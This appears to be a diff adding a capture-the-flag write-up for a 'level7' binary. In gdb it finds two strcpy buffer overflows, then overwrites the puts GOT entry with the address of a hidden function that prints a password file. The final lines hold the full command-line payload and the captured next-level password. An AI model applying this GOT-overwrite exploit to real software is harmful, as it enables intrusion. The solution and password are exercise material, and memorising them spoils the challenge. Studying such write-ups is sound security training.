@@ -1,0 +1,46 @@
+# Call to strcpy which is vulnerable to Buffer Overflow
+=> 0x80485a0 <main+127>:	call   0x80483e0 <strcpy@plt>
+and
+=> 0x80485bd <main+156>:	call   0x80483e0 <strcpy@plt>
+
+# The program read the file `/home/user/level8/.pass` with `fopen` and write it in a global variable with `fgets`
+# A function `m` print this variable but isn't called in the main function
+
+# So we need to call the function `m` AFTER the call to `fgets`
+# This is done by replacing the `puts` GOT (Found after the call to `fgets`)
+=> 0x80485eb <main+202>:	call   0x80483c0 <fgets@plt>
+   0x80485f0 <main+207>:	mov    DWORD PTR [esp],0x8048703
+   0x80485f7 <main+214>:	call   0x8048400 <puts@plt>
+# With a call to `m`
+
+# We use gdb pattern create/search to find at which offset registers are being overwrited
+
+# We found offset 20 for the first `strcpy`
+# Also when we run the following
+gdb> r $(python -c "print 'A'*24") 'BBBB'
+# The first `strcpy` succed but the second ones SEGV with the following arguments
+Guessed arguments:
+arg[0]: 0x41414141 ('AAAA')
+arg[1]: 0xffffd8f0 ("BBBB")
+# This is interesting because it means the second `strcpy` tried to write the value of argv[2] ...
+# ... into the address written in argv[1][20-24]
+
+# Then we need to find the address of `puts@got`
+gdb> disass main
+[...]
+   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+[...]
+gdb> disass 0x8048400
+[...]
+   0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928
+[...]
+gdb> x 0x8049928
+0x8049928 <puts@got.plt>:	0x08048406
+
+# Finally we need the address of the m function
+gdb> x m
+0x80484f4 <m>:	0x83e58955
+
+# Then we just need to write the payload
+$> ./level7 $(python -c "print 'A'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
